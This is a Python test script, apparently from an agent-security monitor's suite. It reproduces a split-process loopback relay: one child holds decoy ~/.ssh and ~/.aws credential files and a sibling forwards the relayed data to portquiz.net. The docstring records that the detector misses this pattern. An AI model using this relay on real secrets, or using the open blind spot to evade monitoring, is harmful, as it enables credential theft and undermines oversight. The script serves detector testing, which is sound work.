#!/usr/bin/env python3
"""
Trigger ``sensitive_material_egress`` via a split-process loopback relay
(blind spot BS-7), promoted from ``edamame_core/tests/evasion``.

Real threat: a compromised agent splits credential access and network
exfiltration across two cooperating processes to defeat single-process L7
correlation. One process holds the credential files open and writes them to a
local relay on 127.0.0.1; a sibling process reads from the relay and
exfiltrates to an external destination. Neither process, viewed alone, is a
``token_exfiltration`` / ``credential_harvest`` shape: the credential holder
never touches an external destination, and the exfiltrator never opens a
credential file.

Detector side (edamame_core, N-05 / increment 6.5): ``detect_sensitive_material_egress``
correlates sessions by **kernel ancestor** (the nearest AI-agent ancestor
pid, else the kernel parent pid, from ``l7.kernel_exec``), falling back to the
coarse token-based ``lineage_key`` when no kernel exec record is present. Two
sibling processes sharing a parent land in one lineage group. When that group
holds (a) a session carrying sensitive material, (b) a *loopback* session, and
(c) a recent external session from a DIFFERENT runtime process that carries no
material, the detector emits a correlated ``sensitive_material_egress`` finding
(basis: lineage_correlation, loopback_correlation).

STATUS 2026-09-10 -- NOT IN THE DEFAULT GATE SET (dispatch-only). The
correlation above was proven only with synthesized sessions: in the live
pipeline legs (a) and (b) are the same object, child A's 127.0.0.1 session,
and ``flodbadd`` excludes loopback interfaces from capture on every platform
(``interface.rs`` ``validate_interfaces`` drops ``lo`` / 127.x, ``capture.rs``
``device_is_usable`` drops the Npcap loopback adapter). The first gate run
that carried the detector (posture ``92205b3``, run 34413252136) produced
zero findings on all four platforms across three attempts each; the
``sessions_snapshot`` holds only child B's external sessions. BS-7 therefore
stays OPEN. Closing it needs one of: loopback capture in flodbadd (every
platform, with the local-service noise that implies), or process-tree
open-file enrichment so an egressing process is joined with the credential
files its siblings hold. Until then run this scenario on purpose via the
``security_scenarios`` dispatch input / ``--scenarios``; it will read as a
miss and that is the truthful result.

This trigger reproduces that shape as **two sibling children of one coordinator
process** so both the kernel-ancestor path (shared parent pid) and the
token-lineage fallback (both children are the same interpreter under the same
interpreter parent) group them together:

  coordinator (this process)
    |-- child A  credential holder + loopback writer
    |             opens ~/.ssh + ~/.aws credential files, connects to
    |             127.0.0.1:<relay>, streams the material
    `-- child B  loopback reader + external exfiltrator
                  binds 127.0.0.1:<relay>, reads, forwards to portquiz.net:63180
                  (NO credential file open)

Detection path:
  child A loopback session  -> sensitive material + is_loopback
  child B external session  -> recent external egress, no material, sibling
  lineage correlation       -> sensitive_material_egress
                               (CRITICAL when correlated+loopback score >= 4,
                                HIGH floor otherwise -- either way alertable)

Reference: process relay / split exfiltration (MITRE ATT&CK T1055).

Cross-platform: macOS, Linux, Windows (multiprocessing start method differs;
the sibling topology and the module-level child entrypoints are picklable so
spawn-based platforms work too).
"""

from __future__ import annotations

import argparse
import multiprocessing
import os
import signal
import socket
import sys
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
    upper_prefix_for,
)

PID_FILE = "loopback_relay.pid"
CHILD_A_PID_FILE = "loopback_relay_a.pid"
CHILD_B_PID_FILE = "loopback_relay_b.pid"
CREATED_MARKER = "loopback_relay.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 63180

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger sensitive_material_egress via a split-process "
                    "loopback relay: two sibling children, one holding "
                    "credentials + writing to 127.0.0.1, one reading loopback "
                    "and egressing externally."
    )
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved external IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=0.5,
                   help="Seconds between relay transmissions")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if not path.exists():
        path.write_text(content, encoding="utf-8")
        try:
            path.chmod(0o600)
        except OSError:
            pass
        record_created(state_dir, path)
    return path


def setup_credential_files(pfx: str, upfx: str, state_dir: Path) -> list[Path]:
    """Two credential categories (ssh + aws) so the correlated finding scores
    toward CRITICAL, staged in recognized sensitive paths."""
    # Literal names carry the markers the runner keys on
    # (demo_relay_ssh_key / demo_relay_aws_credentials); pfx/upfx colour the
    # content only, so attribution is agent-type independent like the other
    # literal-marker scenarios.
    _ = pfx
    ssh_key = ensure_demo_sensitive_file(
        Path("~/.ssh/demo_relay_ssh_key"),
        f"-----BEGIN OPENSSH PRIVATE KEY-----\n{upfx}_RELAY_PAYLOAD\n"
        "-----END OPENSSH PRIVATE KEY-----\n",
        state_dir,
    )
    aws_creds = ensure_demo_sensitive_file(
        Path("~/.aws/demo_relay_aws_credentials"),
        "[default]\naws_access_key_id = AKIARELAYTESTNOTREAL\n"
        "aws_secret_access_key = relay_test_secret_not_real\n",
        state_dir,
    )
    return [ssh_key, aws_creds]


# --------------------------------------------------------------------------
# Child B: loopback reader + external exfiltrator. Binds the relay, publishes
# its port, reads from child A, forwards externally. Holds NO credential file.
# --------------------------------------------------------------------------
def exfiltrator_child(port_q, target_ip: str, target_port: int,
                      duration: float, pid_path: str) -> None:
    try:
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        signal.signal(signal.SIGTERM, signal.SIG_DFL)
    except (ValueError, OSError):
        pass
    try:
        Path(pid_path).write_text(f"{os.getpid()}\n", encoding="utf-8")
    except OSError:
        pass

    relay_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    relay_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    relay_server.bind(("127.0.0.1", 0))
    relay_port = relay_server.getsockname()[1]
    relay_server.listen(1)
    relay_server.settimeout(30.0)
    try:
        port_q.put(relay_port)
    except Exception:
        pass

    print(f"  [child B - exfiltrator] pid={os.getpid()} relay=127.0.0.1:{relay_port} "
          f"target={target_ip}:{target_port} credential_files_open=NONE", flush=True)

    started = time.monotonic()
    ext_sock: socket.socket | None = None
    relay_conn: socket.socket | None = None
    try:
        try:
            relay_conn, _ = relay_server.accept()
            relay_conn.settimeout(5.0)
        except (socket.timeout, OSError):
            return
        finally:
            relay_server.close()

        while True:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break
            try:
                data = relay_conn.recv(8192)
                if not data:
                    break
            except socket.timeout:
                continue
            except OSError:
                break

            if ext_sock is None:
                try:
                    ext_sock = socket.create_connection((target_ip, target_port), timeout=10.0)
                    ext_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    ext_sock.settimeout(30.0)
                except OSError:
                    time.sleep(1.0)
                    continue
            try:
                ext_sock.sendall(data)
            except OSError:
                try:
                    ext_sock.close()
                except OSError:
                    pass
                ext_sock = None
                continue
            try:
                ext_sock.setblocking(False)
                try:
                    ext_sock.recv(65536)
                except (BlockingIOError, OSError):
                    pass
                finally:
                    ext_sock.setblocking(True)
                    ext_sock.settimeout(30.0)
            except OSError:
                pass
    finally:
        for s in (ext_sock, relay_conn):
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
        try:
            Path(pid_path).unlink()
        except (FileNotFoundError, OSError):
            pass


# --------------------------------------------------------------------------
# Child A: credential holder + loopback writer. Opens the credential files,
# connects to child B's relay on 127.0.0.1, streams the material. Never
# touches an external destination.
# --------------------------------------------------------------------------
def credential_writer_child(relay_port: int, cred_paths: list[str],
                            interval: float, duration: float, pid_path: str) -> None:
    try:
        signal.signal(signal.SIGINT, signal.SIG_DFL)
        signal.signal(signal.SIGTERM, signal.SIG_DFL)
    except (ValueError, OSError):
        pass
    try:
        Path(pid_path).write_text(f"{os.getpid()}\n", encoding="utf-8")
    except OSError:
        pass

    handles = []
    for p in cred_paths:
        try:
            h = open(p, "rb")
            h.read(1)
            h.seek(0)
            handles.append(h)
        except OSError:
            pass

    print(f"  [child A - credential holder] pid={os.getpid()} "
          f"open_files={len(handles)} -> 127.0.0.1:{relay_port}", flush=True)

    # Connect to the sibling relay (retry until child B is listening).
    relay = None
    deadline = time.monotonic() + 30.0
    while relay is None and time.monotonic() < deadline:
        try:
            relay = socket.create_connection(("127.0.0.1", relay_port), timeout=5.0)
        except OSError:
            time.sleep(0.5)
    if relay is None:
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        return

    started = time.monotonic()
    interval = max(interval, 0.1)
    seq = 0
    try:
        while True:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break
            seq += 1
            payload = f"EXFIL seq={seq} pid={os.getpid()} files={len(handles)}\n".encode()
            payload += b"X" * 2048
            try:
                relay.sendall(payload)
            except OSError:
                break
            # Re-touch the credentials so the live-open-files poll keeps
            # attributing them to this session across flodbadd cycles.
            for h in handles:
                try:
                    h.seek(0)
                    h.read(1)
                except OSError:
                    pass
            time.sleep(interval)
    finally:
        try:
            relay.close()
        except OSError:
            pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            Path(pid_path).unlink()
        except (FileNotFoundError, OSError):
            pass


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    pfx = file_prefix_for(agent_type)
    upfx = upper_prefix_for(agent_type)
    cred_paths = [str(p) for p in setup_credential_files(pfx, upfx, state_dir)]

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    try:
        target_ip = resolve_target(args.target_ip, args.target_host)
    except OSError as exc:
        print(f"ERROR: cannot resolve external target {args.target_host}: {exc}",
              file=sys.stderr)
        return 1

    duration = max(args.duration, 0.0)
    ctx = multiprocessing.get_context("spawn")
    port_q = ctx.Queue()

    print(f"trigger_loopback_relay.py active  pid={os.getpid()} (coordinator/parent)")
    for p in cred_paths:
        print(f"  credential_file={p}")
    print(f"  external_target={target_ip}:{args.target_port} host={args.target_host}")
    print(f"  interval={max(args.interval, 0.1)}s duration={duration}s")
    print("  topology=two sibling children under one parent (lineage correlation)")
    print("  check=sensitive_material_egress")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    # Child B first (it binds the relay and publishes the port); then child A.
    child_b = ctx.Process(
        target=exfiltrator_child,
        args=(port_q, target_ip, args.target_port, duration,
              str(state_dir / CHILD_B_PID_FILE)),
        daemon=True,
    )
    child_b.start()

    try:
        relay_port = port_q.get(timeout=30)
    except Exception:
        print("ERROR: child B never published a relay port", file=sys.stderr)
        if child_b.is_alive():
            child_b.terminate()
        return 1

    child_a = ctx.Process(
        target=credential_writer_child,
        args=(relay_port, cred_paths, max(args.interval, 0.1), duration,
              str(state_dir / CHILD_A_PID_FILE)),
        daemon=True,
    )
    child_a.start()

    started = time.monotonic()
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break
            if not child_a.is_alive() and not child_b.is_alive():
                break
            time.sleep(0.5)
    finally:
        for child in (child_a, child_b):
            if child.is_alive():
                child.terminate()
                child.join(timeout=5)
                if child.is_alive():
                    child.kill()
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass
        for extra in (CHILD_A_PID_FILE, CHILD_B_PID_FILE):
            try:
                (state_dir / extra).unlink()
            except (FileNotFoundError, OSError):
                pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
